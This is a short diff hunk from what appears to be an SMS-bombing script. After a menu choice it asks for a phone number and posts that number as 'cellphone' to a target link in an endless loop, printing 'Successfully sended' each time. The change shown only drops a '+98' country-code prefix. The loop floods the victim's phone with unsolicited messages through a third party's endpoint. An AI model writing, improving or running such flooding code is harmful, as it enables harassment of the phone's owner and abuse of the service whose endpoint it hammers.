@@ -36,7 +36,7 @@ Elite = int(input("|∆|choose <>> : "))
 if Elite == 1:
     number = input("please send number {9×××××××} : ")
     while True:
-              requests.post(link,data={"cellphone":"+98"+number})
+              requests.post(link,data={"cellphone":number})
               print("Successfully sended", number)
 elif Elite == 3:
     os.system("clear")
